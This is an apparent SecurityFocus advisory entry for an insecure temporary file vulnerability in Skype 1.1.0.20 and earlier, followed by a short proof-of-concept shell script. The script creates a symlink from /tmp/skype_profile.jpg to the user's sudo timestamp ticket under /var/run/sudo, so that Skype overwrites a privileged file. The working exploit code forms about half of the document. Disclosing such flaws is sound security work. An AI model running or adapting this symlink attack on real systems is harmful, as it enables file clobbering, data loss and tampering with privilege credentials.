source: http://www.securityfocus.com/bid/14293/info

Skype is affected by an insecure temporary file creation vulnerability.

Exploitation would most likely result in loss of data or a denial of service if critical files are overwritten in the attack. Other attacks may be possible as well.

Skype 1.1.0.20 and prior versions are affected. 

#!/bin/sh

#get current terminal number from /dev/pts/xx
terminal_number=`tty | cut -f4 -d '/'`

user_ticket=$USER/$terminal_number:root
ln -s /var/run/sudo/$user_ticket /tmp/skype_profile.jpg 